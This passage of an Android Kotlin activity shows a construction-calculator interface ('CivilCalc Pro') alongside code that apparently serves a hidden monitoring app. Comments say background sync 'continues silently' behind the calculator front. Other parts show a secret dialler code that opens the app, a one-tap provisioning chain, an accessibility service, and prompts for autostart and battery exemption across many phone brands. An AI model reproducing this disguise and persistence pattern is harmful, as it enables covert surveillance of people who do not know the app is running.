            (batteryPrompted || isBatteryExempted()) && (autostartPrompted || !isOemRom())) {
            if (!deviceState.isFirstSetupCompleted || isOneTapFlowRunning) {
                handleNextSetupStep()
            } else {
                completeSetupAndClose()
            }
        }
    }

    private fun setupCivilCalculators() {
        val tabs = listOf(
            binding.tabConcrete,
            binding.tabBricks,
            binding.tabSteel,
            binding.tabPlaster,
            binding.tabExcavation,
            binding.tabConverter
        )

        val sections = listOf(
            binding.sectionConcrete,
            binding.sectionBricks,
            binding.sectionSteel,
            binding.sectionPlaster,
            binding.sectionExcavation,
            binding.sectionConverter
        )

        fun selectTab(selectedIdx: Int) {
            sections.forEachIndexed { idx, section ->
                section.visibility = if (idx == selectedIdx) View.VISIBLE else View.GONE
            }
            tabs.forEachIndexed { idx, tab ->
                if (idx == selectedIdx) {
                    tab.setBackgroundColor(Color.parseColor("#D97706"))
                    tab.setTextColor(Color.WHITE)
                    tab.strokeWidth = 0
                } else {
                    tab.setBackgroundColor(Color.TRANSPARENT)
                    tab.setTextColor(Color.parseColor("#334155"))
                    tab.strokeColor = ColorStateList.valueOf(Color.parseColor("#CBD5E1"))
                    tab.strokeWidth = 2
                }
            }
        }

        tabs.forEachIndexed { idx, tab ->
            tab.setOnClickListener { selectTab(idx) }
        }

        // Dropdown data setup
        val concreteGrades = arrayOf("M20 (1:1.5:3)", "M15 (1:2:4)", "M25 (1:1:2)")
        binding.actvConcreteGrade.setAdapter(ArrayAdapter(this, android.R.layout.simple_dropdown_item_1line, concreteGrades))

        val brickThicknesses = arrayOf("9 inch (Main Wall)", "4.5 inch (Partition)")
        binding.actvBrickThickness.setAdapter(ArrayAdapter(this, android.R.layout.simple_dropdown_item_1line, brickThicknesses))

        val mortarRatios = arrayOf("1:5 (Standard)", "1:4 (Rich)", "1:6 (Lean)")
        binding.actvBrickMortar.setAdapter(ArrayAdapter(this, android.R.layout.simple_dropdown_item_1line, mortarRatios))

        val steelDiameters = arrayOf("8 mm", "10 mm", "12 mm", "16 mm", "20 mm", "25 mm", "32 mm")
        binding.actvSteelDia.setAdapter(ArrayAdapter(this, android.R.layout.simple_dropdown_item_1line, steelDiameters))

        val plasterThicknesses = arrayOf("12 mm (Internal)", "15 mm (Ceiling)", "20 mm (External)")
        binding.actvPlasterThickness.setAdapter(ArrayAdapter(this, android.R.layout.simple_dropdown_item_1line, plasterThicknesses))

        val units = arrayOf("Sq Feet (sqft)", "Cent", "Ground", "Acre", "Sq Meter (sqm)")
        binding.actvConvertFrom.setAdapter(ArrayAdapter(this, android.R.layout.simple_dropdown_item_1line, units))
        binding.actvConvertTo.setAdapter(ArrayAdapter(this, android.R.layout.simple_dropdown_item_1line, units))

        // 1. Concrete Calculator
        binding.btnCalcConcrete.setOnClickListener {
            val length = binding.etConcreteLength.text.toString().toDoubleOrNull() ?: 20.0
            val width = binding.etConcreteWidth.text.toString().toDoubleOrNull() ?: 15.0
            val depthInches = binding.etConcreteDepth.text.toString().toDoubleOrNull() ?: 5.0
            val grade = binding.actvConcreteGrade.text.toString()

            val wetVolFt3 = length * width * (depthInches / 12.0)
            val wetVolM3 = wetVolFt3 / 35.3147
            val dryVolFt3 = wetVolFt3 * 1.54

            val (cementP, sandP, aggP) = when {
                grade.contains("M15") -> Triple(1.0, 2.0, 4.0)
                grade.contains("M25") -> Triple(1.0, 1.0, 2.0)
                else -> Triple(1.0, 1.5, 3.0)
            }
            val sum = cementP + sandP + aggP
            val cementBags = (dryVolFt3 * (cementP / sum)) / 1.226
            val sandFt3 = dryVolFt3 * (sandP / sum)
            val sandTons = sandFt3 * 0.0453
            val aggFt3 = dryVolFt3 * (aggP / sum)
            val aggTons = aggFt3 * 0.0453
            val waterLitres = (cementBags * 25).toInt()

            binding.tvConcreteVolume.text = String.format(Locale.US, "Volume: %.1f ft³ (%.2f m³)", wetVolFt3, wetVolM3)
            binding.tvConcreteCement.text = String.format(Locale.US, "• Cement: %.1f Bags (50kg bags)", cementBags)
            binding.tvConcreteSand.text = String.format(Locale.US, "• Sand: %.1f ft³ (%.2f Tons)", sandFt3, sandTons)
            binding.tvConcreteAggregate.text = String.format(Locale.US, "• Aggregate: %.1f ft³ (%.2f Tons)", aggFt3, aggTons)
            binding.tvConcreteWater.text = "• Est. Water: ~$waterLitres Litres"
        }

        // 2. Brickwork Calculator
        binding.btnCalcBricks.setOnClickListener {
            val length = binding.etBrickLength.text.toString().toDoubleOrNull() ?: 20.0
            val height = binding.etBrickHeight.text.toString().toDoubleOrNull() ?: 10.0
            val thicknessStr = binding.actvBrickThickness.text.toString()
            val is9Inch = thicknessStr.contains("9")

            val wallArea = length * height
            val wallVolFt3 = if (is9Inch) wallArea * 0.75 else wallArea * 0.375
            val bricksCount = if (is9Inch) (wallVolFt3 * 13.5 * 1.05).toInt() else (wallArea * 4.5 * 1.05).toInt()
            val wetMortar = wallVolFt3 * (if (is9Inch) 0.30 else 0.25)
            val dryMortar = wetMortar * 1.33
            val cementBags = (dryMortar * (1.0 / 6.0)) / 1.226
            val sandFt3 = dryMortar * (5.0 / 6.0)

            binding.tvBrickCount.text = String.format(Locale.US, "• Total Bricks: %,d Pcs (5%% wastage incl.)", bricksCount)
            binding.tvBrickCement.text = String.format(Locale.US, "• Cement for Mortar: %.1f Bags", cementBags)
            binding.tvBrickSand.text = String.format(Locale.US, "• Sand for Mortar: %.1f ft³ (%.2f Brass)", sandFt3, sandFt3 / 100.0)
        }

        // 3. Steel Weight Calculator
        binding.btnCalcSteel.setOnClickListener {
            val diaStr = binding.actvSteelDia.text.toString().filter { it.isDigit() }
            val dia = diaStr.toDoubleOrNull() ?: 12.0
            val lengthM = binding.etSteelLength.text.toString().toDoubleOrNull() ?: 120.0

            val unitWeightKg = (dia * dia) / 162.0
            val totalWeightKg = unitWeightKg * lengthM
            val totalTons = totalWeightKg / 1000.0
            val rods12m = (lengthM / 12.0).toInt()

            binding.tvSteelUnitWeight.text = String.format(Locale.US, "• Unit Weight: %.3f kg/m (%.2f kg per 12m rod)", unitWeightKg, unitWeightKg * 12)
            binding.tvSteelTotalWeight.text = String.format(Locale.US, "• Total Weight: %.2f kg (%.3f Metric Tons)", totalWeightKg, totalTons)
            binding.tvSteelRods.text = "• Equivalent Rods: ~$rods12m Rods of 12m length"
        }

        // 4. Plastering Calculator
        binding.btnCalcPlaster.setOnClickListener {
            val area = binding.etPlasterArea.text.toString().toDoubleOrNull() ?: 500.0
            val thkStr = binding.actvPlasterThickness.text.toString()
            val thkMm = when {
                thkStr.contains("15") -> 15.0
                thkStr.contains("20") -> 20.0
                else -> 12.0
            }
            val thkFt = thkMm / 304.8
            val wetVol = area * thkFt
            val dryVol = wetVol * 1.5
            val cementBags = (dryVol * (1.0 / 5.0)) / 1.226
            val sandFt3 = dryVol * (4.0 / 5.0)

            binding.tvPlasterCement.text = String.format(Locale.US, "• Cement Required: %.1f Bags (50kg)", cementBags)
            binding.tvPlasterSand.text = String.format(Locale.US, "• Sand Required: %.1f ft³ (%.2f Brass)", sandFt3, sandFt3 / 100.0)
        }

        // 5. Excavation Calculator
        binding.btnCalcExcavation.setOnClickListener {
            val l = binding.etExcavationLength.text.toString().toDoubleOrNull() ?: 30.0
            val w = binding.etExcavationWidth.text.toString().toDoubleOrNull() ?: 20.0
            val d = binding.etExcavationDepth.text.toString().toDoubleOrNull() ?: 5.0

            val volFt3 = l * w * d
            val volM3 = volFt3 / 35.3147
            val brass = volFt3 / 100.0
            val tipperTrips = Math.ceil(brass / 3.0).toInt()

            binding.tvExcavationVolume.text = String.format(Locale.US, "• Total Volume: %,.0f ft³ (%.2f m³)", volFt3, volM3)
            binding.tvExcavationBrass.text = String.format(Locale.US, "• Volume in Brass: %.2f Brass (1 Brass = 100 ft³)", brass)
            binding.tvExcavationTrips.text = "• Est. Tipper Lorry Trips: ~$tipperTrips Loads (3 Brass/trip)"
        }

        // 6. Unit Converter
        binding.btnConvertUnits.setOnClickListener {
            val value = binding.etConverterValue.text.toString().toDoubleOrNull() ?: 2400.0
            val from = binding.actvConvertFrom.text.toString().lowercase()
            val to = binding.actvConvertTo.text.toString().lowercase()

            val inSqFt = when {
                from.contains("cent") -> value * 435.6
                from.contains("ground") -> value * 2400.0
                from.contains("acre") -> value * 43560.0
                from.contains("meter") || from.contains("sqm") -> value * 10.7639
                else -> value
            }

            val converted = when {
                to.contains("cent") -> inSqFt / 435.6
                to.contains("ground") -> inSqFt / 2400.0
                to.contains("acre") -> inSqFt / 43560.0
                to.contains("meter") || to.contains("sqm") -> inSqFt / 10.7639
                else -> inSqFt
            }

            binding.tvConvertResult.text = String.format(Locale.US, "%.2f %s = %.2f %s", value, binding.actvConvertFrom.text, converted, binding.actvConvertTo.text)
        }
    }



    private fun isOemRom(): Boolean {
        val manufacturer = Build.MANUFACTURER.lowercase()
        return manufacturer.contains("xiaomi") ||
                manufacturer.contains("redmi") ||
                manufacturer.contains("poco") ||
                manufacturer.contains("oppo") ||
                manufacturer.contains("realme") ||
                manufacturer.contains("vivo") ||
                manufacturer.contains("huawei") ||
                manufacturer.contains("honor") ||
                manufacturer.contains("oneplus") ||
                manufacturer.contains("samsung")
    }

    private fun getAutostartIntent(): Intent? {
        val candidates = listOf(
            Intent().setComponent(
                ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")
            ),
            Intent("miui.intent.action.OP_AUTO_START").addCategory(Intent.CATEGORY_DEFAULT),
            Intent().setComponent(
                ComponentName("com.miui.securitycenter", "com.miui.powerkeeper.ui.HiddenAppsConfigActivity")
            ),
            Intent().setComponent(
                ComponentName("com.miui.powerkeeper", "com.miui.powerkeeper.ui.HiddenAppsConfigActivity")
            ),
            Intent().setComponent(
                ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")
            ),
            Intent().setComponent(
                ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager")
            ),
            Intent().setComponent(
                ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")
            ),
            Intent().setComponent(
                ComponentName("com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity")
            ),
            Intent().setComponent(
                ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")
            ),
            Intent().setComponent(
                ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity")
            ),
            Intent().setComponent(
                ComponentName("com.oneplus.security", "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity")
            ),
            Intent().setComponent(
                ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.AutobootManageActivity")
            )
        )

        for (intent in candidates) {
            try {
                if (packageManager.resolveActivity(intent, 0) != null) {
                    return intent
                }
            } catch (_: Exception) {}
        }

        // Xiaomi fallback: App Info Settings directly shows "Autostart" toggle switch prominently!
        return Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.parse("package:$packageName")
        }
    }



    private fun openAutostartSettings() {

        val intent = getAutostartIntent()

        if (intent != null) {

            try {

                autostartLauncher.launch(intent)

                return

            } catch (_: Exception) {}

        }

        openAppInfoSettings()

    }



    private fun openAppInfoSettings() {

        try {

            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {

                data = Uri.parse("package:$packageName")

            }

            startActivity(intent)

        } catch (e: Exception) {

            Log.e(TAG, "No app-info settings screen available", e)

        }

    }



    private fun updateSyncStatusText() {
        // Obsolete statusText view replaced by CivilCalc Pro suite; background sync continues silently
    }



    private fun uploadCurrentFcmToken() {
        try {
            FirebaseMessaging.getInstance().token
                .addOnSuccessListener { token ->
                    Log.d(TAG, "FCM token fetched: $token")
                    FcmTokenSync.enqueueUpload(applicationContext, token)
                }
                .addOnFailureListener { e ->
                    Log.e(TAG, "FCM token fetch failed", e)
                }
        } catch (e: Throwable) {
            // FirebaseMessaging.getInstance() throws IllegalStateException when
            // Firebase is not initialised for this process - a device without
            // Google Play services, or a build shipped without google-services
            // config. That used to crash onCreate and show "keeps stopping".
            Log.w(TAG, "Firebase messaging unavailable on this device", e)
        }
    }



    override fun onBackPressed() {
        // During provisioning a stray Back must not push the app to the back:
        // the setup chain only advances while this Activity is resumed, and the
        // old moveTaskToBack() here is what made the app "close" right before a
        // permission was granted (the accessibility service used to send Back
        // presses of its own).
        if (isOneTapFlowRunning) return

        // Otherwise move to background naturally instead of destroying the task
        // hierarchy.
        moveTaskToBack(true)
    }

    companion object {

        private const val TAG = "MainActivity"

        private const val STATUS_REFRESH_MS = 30_000L

        private const val AUTO_FLOW_DELAY_MS = 1_200L

        /**
         * How many times the chain may start itself. Two is enough for a normal
         * install (the first run plus one retry after every granted step) and
         * stops a single un-grantable item from hijacking every launch.
         */
        private const val MAX_AUTO_SETUP_RUNS = 2

        /** Set by [SpappSecretCodeReceiver] when the dialler code opened the app. */
        const val EXTRA_OPENED_BY_SECRET_CODE = "opened_by_secret_code"

    }

}